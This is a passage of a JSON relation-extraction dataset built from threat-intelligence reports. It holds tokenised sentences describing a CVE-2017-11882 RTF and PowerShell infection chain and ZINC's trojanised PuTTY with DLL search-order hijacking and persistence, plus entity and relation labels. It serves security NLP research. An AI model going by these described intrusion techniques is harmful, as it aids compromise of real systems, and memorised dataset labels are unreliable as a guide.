"h": 6}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 8}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 10}, {"r": "FR", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 12, "t": 14}, {"r": "CO", "evidence": [4], "h": 14, "t": 15}, {"r": "FR", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "EX", "evidence": [5, 6], "t": 16, "h": 18}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "ST", "evidence": [6], "h": 18, "t": 20}, {"r": "FR", "evidence": [6, 7], "h": 18, "t": 21}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}]}, {"title": "044-3", "sents": [["The", "Stage", "2", "payload", "remains", "base64-encoded", "as", "a", "counterfeit", "certificate", "within", "the", "maldoc", "."], ["The", "following", "PowerShell", "script", "(", "Stage", "2", ")", "decodes", "another", "payload", "(", "in", "this", "case", "a", "loader", "executable", ")", "and", "activates", "it", "on", "the", "infected", "device", "."], ["To", "begin", ",", "the", "loader", "executable", "establishes", "persistence", "by", "creating", "a", "shortcut", "in", "the", "current", "user", "'s", "Startup", "directory", "."], ["The", "executable", "then", "compiles", "hardcoded", "C", "#", "code", "into", "an", "executable", "assembly", "and", "runs", "the", "entry", "point", "for", "the", "compiled", "malicious", "code", "."], ["The", "final", "payload", "consists", "of", "C", "#", "code", "compiled", "and", "invoked", "into", "the", "Stage", "3", "compiler", "process", "."], ["The", "File", "Enumerator", "module", "catalogs", "specific", "file", "types", "on", "the", "machine", "and", "transfers", "the", "path", "information", "to", "the", "C2", "."], ["These", "modules", "infect", "benign", "Office", "documents", "with", "malicious", "OLE", "objects", "to", "weaponize", "them", "to", "exploit", "CVE-2017-11882", "."], ["Once", "again", ",", "these", "infection", "chains", "rely", "on", "malicious", "RTF", "files", "leveraging", "CVE-2017-11882", "to", "activate", "the", "Stage", "2", "PS1", "script", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "payload", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "certificate", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [16, 16], "name": "PowerShell script", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "Stage 2", "pos": [5, 7], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [23, 23], "name": "another", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "payload", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "loader executable", "pos": [16, 18], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [45, 45], "name": "loader executable", "pos": [4, 6], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [52, 52], "name": "shortcut", "pos": [11, 12], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "The executable", "pos": [0, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [66, 66], "name": "C # code", "pos": [5, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "executable assembly", "pos": [10, 12], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [80, 80], "name": "compiled malicious code", "pos": [19, 22], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "final payload", "pos": [1, 3], "index": "13_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [99, 99], "name": "compiler process", "pos": [15, 17], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "File Enumerator", "pos": [1, 3], "index": "15_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [116, 116], "name": "path", "pos": [14, 15], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [120, 120], "name": "C2", "pos": [18, 19], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [123, 123], "name": "modules", "pos": [1, 2], "index": "18_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [126, 126], "name": "Office documents", "pos": [4, 6], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [143, 143], "name": "infection chains", "pos": [4, 6], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [148, 148], "name": "RTF files", "pos": [9, 11], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [157, 157], "name": "PS1 script", "pos": [18, 20], "index": "22_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "WR", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 11}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "FR", "evidence": [4, 5], "h": 14, "t": 15}, {"r": "EX", "evidence": [4, 5], "t": 13, "h": 15}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "ST", "evidence": [5], "h": 15, "t": 17}, {"r": "FR", "evidence": [5, 6], "h": 15, "t": 18}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [7], "h": 20, "t": 21}, {"r": "EX", "evidence": [7], "h": 20, "t": 22}]}, {"title": "044-4", "sents": [["The", "following", "PowerShell", "script", "(", "Stage", "2", ")", "decodes", "another", "payload", "(", "in", "this", "case", "a", "loader", "executable", ")", "and", "activates", "it", "on", "the", "infected", "device", "."], ["To", "begin", ",", "the", "loader", "executable", "establishes", "persistence", "by", "creating", "a", "shortcut", "in", "the", "current", "user", "'s", "Startup", "directory", "."], ["The", "executable", "then", "compiles", "hardcoded", "C", "#", "code", "into", "an", "executable", "assembly", "and", "runs", "the", "entry", "point", "for", "the", "compiled", "malicious", "code", "."], ["The", "final", "payload", "consists", "of", "C", "#", "code", "compiled", "and", "invoked", "into", "the", "Stage", "3", "compiler", "process", "."], ["The", "File", "Enumerator", "module", "catalogs", "specific", "file", "types", "on", "the", "machine", "and", "transfers", "the", "path", "information", "to", "the", "C2", "."], ["These", "modules", "infect", "benign", "Office", "documents", "with", "malicious", "OLE", "objects", "to", "weaponize", "them", "to", "exploit", "CVE-2017-11882", "."], ["Once", "again", ",", "these", "infection", "chains", "rely", "on", "malicious", "RTF", "files", "leveraging", "CVE-2017-11882", "to", "activate", "the", "Stage", "2", "PS1", "script", "."], ["The", "Stage", "2", "script", "creates", "a", "BAT", "file", "on", "disk", ",", "which", "then", "triggers", "another", "PowerShell", "command", "to", "download", "and", "activate", "the", "final", "payload", "on", "the", "infected", "device", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "PowerShell script", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "Stage 2", "pos": [5, 7], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [9, 9], "name": "another", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "payload", "pos": [10, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "loader executable", "pos": [16, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "loader executable", "pos": [4, 6], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [38, 38], "name": "shortcut", "pos": [11, 12], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "The executable", "pos": [0, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "C # code", "pos": [5, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "executable assembly", "pos": [10, 12], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "compiled malicious code", "pos": [19, 22], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "final payload", "pos": [1, 3], "index": "11_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [85, 85], "name": "compiler process", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "File Enumerator", "pos": [1, 3], "index": "13_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [102, 102], "name": "path", "pos": [14, 15], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [106, 106], "name": "C2", "pos": [18, 19], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [109, 109], "name": "modules", "pos": [1, 2], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [112, 112], "name": "Office documents", "pos": [4, 6], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [129, 129], "name": "infection chains", "pos": [4, 6], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [134, 134], "name": "RTF files", "pos": [9, 11], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [143, 143], "name": "PS1 script", "pos": [18, 20], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [149, 149], "name": "script", "pos": [3, 4], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [152, 152], "name": "BAT file", "pos": [6, 8], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [155, 155], "name": "disk", "pos": [9, 10], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [161, 161], "name": "PowerShell command", "pos": [15, 17], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "final payload", "pos": [22, 24], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 3}, {"r": "RD", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 4}, {"r": "WR", "evidence": [0, 1], "t": 4, "h": 5}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "CO", "evidence": [2], "h": 9, "t": 10}, {"r": "FR", "evidence": [3, 4], "h": 12, "t": 13}, {"r": "EX", "evidence": [3, 4], "t": 11, "h": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "ST", "evidence": [4], "h": 13, "t": 15}, {"r": "FR", "evidence": [4, 5], "h": 13, "t": 16}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "EX", "evidence": [6], "h": 18, "t": 20}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "EX", "evidence": [7], "h": 23, "t": 24}, {"r": "WR", "evidence": [7], "h": 23, "t": 25}]}, {"title": "044-5", "sents": [["To", "begin", ",", "the", "loader", "executable", "establishes", "persistence", "by", "creating", "a", "shortcut", "in", "the", "current", "user", "'s", "Startup", "directory", "."], ["The", "executable", "then", "compiles", "hardcoded", "C", "#", "code", "into", "an", "executable", "assembly", "and", "runs", "the", "entry", "point", "for", "the", "compiled", "malicious", "code", "."], ["The", "final", "payload", "consists", "of", "C", "#", "code", "compiled", "and", "invoked", "into", "the", "Stage", "3", "compiler", "process", "."], ["The", "File", "Enumerator", "module", "catalogs", "specific", "file", "types", "on", "the", "machine", "and", "transfers", "the", "path", "information", "to", "the", "C2", "."], ["These", "modules", "infect", "benign", "Office", "documents", "with", "malicious", "OLE", "objects", "to", "weaponize", "them", "to", "exploit", "CVE-2017-11882", "."], ["Once", "again", ",", "these", "infection", "chains", "rely", "on", "malicious", "RTF", "files", "leveraging", "CVE-2017-11882", "to", "activate", "the", "Stage", "2", "PS1", "script", "."], ["The", "Stage", "2", "script", "creates", "a", "BAT", "file", "on", "disk", ",", "which", "then", "triggers", "another", "PowerShell", "command", "to", "download", "and", "activate", "the", "final", "payload", "on", "the", "infected", "device", "."], ["Subsequently", ",", "the", "BAT", "file", "fetches", "the", "final", "payload", "from", "the", "specified", "remote", "location", "and", "activates", "it", "on", "the", "device", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "loader executable", "pos": [4, 6], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [11, 11], "name": "shortcut", "pos": [11, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "The executable", "pos": [0, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "C # code", "pos": [5, 8], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "executable assembly", "pos": [10, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "compiled malicious code", "pos": [19, 22], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "final payload", "pos": [1, 3], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [58, 58], "name": "compiler process", "pos": [15, 17], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "File Enumerator", "pos": [1, 3], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [75, 75], "name": "path", "pos": [14, 15], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [79, 79], "name": "C2", "pos": [18, 19], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [82, 82], "name": "modules", "pos": [1, 2], "index": "11_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [85, 85], "name": "Office documents", "pos": [4, 6], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [102, 102], "name": "infection chains", "pos": [4, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [107, 107], "name": "RTF files", "pos": [9, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "PS1 script", "pos": [18, 20], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [122, 122], "name": "script", "pos": [3, 4], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [125, 125], "name": "BAT file", "pos": [6, 8], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [128, 128], "name": "disk", "pos": [9, 10], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [134, 134], "name": "PowerShell command", "pos": [15, 17], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [141, 141], "name": "final payload", "pos": [22, 24], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [151, 151], "name": "BAT file", "pos": [3, 5], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [155, 155], "name": "final payload", "pos": [7, 9], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [160, 160], "name": "remote location", "pos": [12, 14], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [164, 164], "name": "it", "pos": [16, 17], "index": "24_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 4}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "EX", "evidence": [2, 3], "t": 6, "h": 8}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "FR", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "EX", "evidence": [5], "h": 13, "t": 15}, {"r": "WR", "evidence": [6], "h": 16, "t": 17}, {"r": "EX", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "FR", "evidence": [6, 7], "h": 16, "t": 21}, {"r": "EX", "evidence": [6, 7], "t": 17, "h": 21}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "ST", "evidence": [7], "h": 21, "t": 23}, {"r": "RF", "evidence": [7], "h": 21, "t": 23}, {"r": "CO", "evidence": [7], "h": 22, "t": 24}]}, {"title": "054-0", "sents": [["The", "ZetaNile", "malware", "family", "'s", "implant", "DLLs", "are", "either", "encrypted", "or", "packed", "with", "commercial", "software", "protectors", "such", "as", "Themida", "and", "VMProtect", "."], ["In", "the", "malicious", "DLL", ",", "the", "decrypted", "payload", "uses", "a", "custom", "key", "passed", "as", "part", "of", "the", "DLL", "search", "order", "hijacking", "of", "a", "legitimate", "Windows", "process", ",", "as", "shown", "in", "Figure", "3", ".", "The", "malware", "family", "uses", "unique", "custom", "encryption", "methods", "or", "AES", "encryption", "to", "generate", "command", "and", "control", "(", "C2", ")", "HTTP", "requests", "to", "known", "compromised", "C2", "domains", "."], ["To", "make", "C2", "communications", "blend", "in", "with", "legitimate", "traffic", ",", "ZetaNile", "encodes", "the", "victim", "information", "in", "parameters", "for", "common", "keywords", "such", "as", "gametype", "or", "bbs", "."], ["Upon", "establishing", "a", "connection", "with", "the", "target", ",", "ZINC", "operationalized", "PuTTY", "and", "KiTTY", ",", "malicious", "versions", "of", "two", "SSH", "clients", ",", "that", "act", "as", "entry", "vectors", "for", "the", "ZetaNile", "implant", ".", "The", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "ReadMe.txt", "to", "run", "after", "downloading", "the", "archive", "."], ["ZINC", "has", "developed", "the", "ZetaNile", "malware", "family", "to", "evade", "traditional", "defenses", ".", "The", "included", "executable", "file", "runs", "without", "dropping", "the", "ZetaNile", "implant", ",", "as", "part", "of", "this", "evolution", "."], ["For", "deployment", "of", "ZetaNile", ",", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "is", "necessary", "for", "the", "SSH", "utility", ".", "The", "malicious", "PUTTY.exe", "is", "programmed", "to", "install", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", ",", "copying", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["ZINC", "loads", "the", "second", "stage", "malware", ",", "colorui.dll", ",", "using", "DLL", "search", "order", "hijacking", "and", "decodes", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "for", "use", "in", "command", "and", "control", "."], ["After", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", ".", "Lastly", ",", "ZINC", "establishes", "persistence", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "weaponized", "PuTTY", "configuration", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "implant DLLs", "pos": [5, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "Themida", "pos": [18, 19], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "VMProtect", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "DLL", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "payload", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "custom key", "pos": [10, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "DLL", "pos": [17, 18], "index": "6_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [46, 46], "name": "Windows process", "pos": [24, 26], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [56, 56], "name": "malware family", "pos": [34, 36], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [60, 60], "name": "custom encryption", "pos": [38, 40], "index": "9_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [64, 64], "name": "AES encryption", "pos": [42, 44], "index": "10_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [79, 79], "name": "C2 domains", "pos": [57, 59], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [92, 92], "name": "ZetaNile", "pos": [10, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [95, 95], "name": "victim information", "pos": [13, 15], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [114, 114], "name": "target", "pos": [6, 7], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [116, 116], "name": "ZINC", "pos": [8, 9], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [118, 118], "name": "PuTTY", "pos": [10, 11], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [120, 120], "name": "KiTTY", "pos": [12, 13], "index": "17_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [126, 126], "name": "SSH clients", "pos": [18, 20], "index": "18_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [136, 136], "name": "ZetaNile implant", "pos": [28, 30], "index": "19_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [140, 140], "name": "recipient", "pos": [32, 33], "index": "20_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [145, 145], "name": "executable file", "pos": [37, 39], "index": "21_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [149, 149], "name": "ReadMe.txt", "pos": [41, 42], "index": "22_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [157, 157], "name": "ZINC", "pos": [0, 1], "index": "23_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [177, 177], "name": "ZetaNile implant", "pos": [20, 22], "index": "24_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [189, 189], "name": "ZetaNile", "pos": [3, 4], "index": "25_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [196, 196], "name": "ReadMe.txt", "pos": [10, 11], "index": "26_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [202, 202], "name": "SSH utility", "pos": [16, 18], "index": "27_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [207, 207], "name": "PUTTY.exe", "pos": [21, 22], "index": "28_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [212, 212], "name": "Event Horizon malware", "pos": [26, 29], "index": "29_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [216, 216], "name": "C : \\ProgramData\\colorui.dll", "pos": [30, 33], "index": "30_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [221, 221], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [35, 38], "index": "31_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [225, 225], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [39, 42], "index": "32_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [229, 229], "name": "ZINC", "pos": [0, 1], "index": "33_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [236, 236], "name": "colorui.dll", "pos": [7, 8], "index": "34_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [246, 246], "name": "payload", "pos": [17, 18], "index": "35_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [251, 251], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [22, 23], "index": "36_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [265, 265], "name": "C2 server", "pos": [5, 7], "index": "37_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [269, 269], "name": "attackers", "pos": [9, 10], "index": "38_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [273, 273], "name": "malware", "pos": [13, 14], "index": "39_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [296, 296], "name": "PackageColor", "pos": [36, 37], "index": "40_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [302, 302], "name": "weaponized PuTTY", "pos": [42, 44], "index": "41_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "t": 3, "h": 5}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "RD", "evidence": [1], "t": 6, "h": 7}, {"r": "IJ", "evidence": [1], "h": 8, "t": 9}, {"r": "IJ", "evidence": [1], "h": 8, "t": 10}, {"r": "ST", "evidence": [1], "h": 8, "t": 11}, {"r": "RF", "evidence": [1], "h": 8, "t": 11}, {"r": "CO", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [2], "h": 12, "t": 13}, {"r": "CO", "evidence": [2, 3], "h": 12, "t": 19}, {"r": "ST", "evidence": [3], "t": 14, "h": 15}, {"r": "RF", "evidence": [3], "t": 14, "h": 15}, {"r": "FR", "evidence": [3], "h": 16, "t": 20}, {"r": "EX", "evidence": [3], "h": 20, "t": 21}, {"r": "CO", "evidence": [3, 4, 5], "h": 22, "t": 26}, {"r": "RD", "evidence": [3, 4], "t": 21, "h": 23}, {"r": "WR", "evidence": [4], "h": 23, "t": 24}, {"r": "WR", "evidence": [4], "h": 23, "t": 24}, {"r": "WR", "evidence": [4, 5], "t": 24, "h": 25}, {"r": "WR", "evidence": [4, 5], "t": 24, "h": 25}, {"r": "RD", "evidence": [5], "t": 26, "h": 27}, {"r": "RD", "evidence": [5], "h": 28, "t": 30}, {"r": "FR", "evidence": [5], "h": 28, "t": 29}, {"r": "WR", "evidence": [5], "h": 28, "t": 30}, {"r": "RD", "evidence": [5], "h": 28, "t": 32}, {"r": "RD", "evidence": [5], "h": 28, "t": 31}, {"r": "WR", "evidence": [5], "h": 28, "t": 32}, {"r": "WR", "evidence": [6], "h": 33, "t": 34}, {"r": "RD", "evidence": [6], "h": 33, "t": 35}, {"r": "RD", "evidence": [6], "h": 33, "t": 36}, {"r": "ST", "evidence": [7], "t": 37, "h": 38}, {"r": "RF", "evidence": [7], "t": 37, "h": 38}, {"r": "FR", "evidence": [7], "h": 38, "t": 39}, {"r": "FR", "evidence": [7], "t": 40, "h": 41}]}, {"title": "054-1", "sents": [["In", "the", "malicious", "DLL", ",", "the", "decrypted", "payload", "uses", "a", "custom", "key", "passed", "as", "part", "of", "the", "DLL", "search", "order", "hijacking", "of", "a", "legitimate", "Windows", "process", ",", "as", "shown", "in", "Figure", "3", ".", "The", "malware", "family", "uses", "unique", "custom", "encryption", "methods", "or", "AES", "encryption", "to", "generate", "command", "and", "control", "(", "C2", ")", "HTTP", "requests", "to", "known", "compromised", "C2", "domains", "."], ["To", "make", "C2", "communications", "blend", "in", "with", "legitimate", "traffic", ",", "ZetaNile", "encodes", "the", "victim", "information", "in", "parameters", "for", "common", "keywords", "such", "as", "gametype", "or", "bbs", "."], ["Upon", "establishing", "a", "connection", "with", "the", "target", ",", "ZINC", "operationalized", "PuTTY", "and", "KiTTY", ",", "malicious", "versions", "of", "two", "SSH", "clients", ",", "that", "act", "as", "entry", "vectors", "for", "the", "ZetaNile", "implant", ".", "The", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "ReadMe.txt", "to", "run", "after", "downloading", "the", "archive", "."], ["ZINC", "has", "developed", "the", "ZetaNile", "malware", "family", "to", "evade", "traditional", "defenses", ".", "The", "included", "executable", "file", "runs", "without", "dropping", "the", "ZetaNile", "implant", ",", "as", "part", "of", "this", "evolution", "."], ["For", "deployment", "of", "ZetaNile", ",", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "is", "necessary", "for", "the", "SSH", "utility", ".", "The", "malicious", "PUTTY.exe", "is", "programmed", "to", "install", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", ",", "copying", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["ZINC", "loads", "the", "second", "stage", "malware", ",", "colorui.dll", ",", "using", "DLL", "search", "order", "hijacking", "and", "decodes", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "for", "use", "in", "command", "and", "control", "."], ["After", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", ".", "Lastly", ",", "ZINC", "establishes", "persistence", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "weaponized", "PuTTY", "configuration", "."], ["To", "ensure", "persistence", ",", "the", "ZINC", 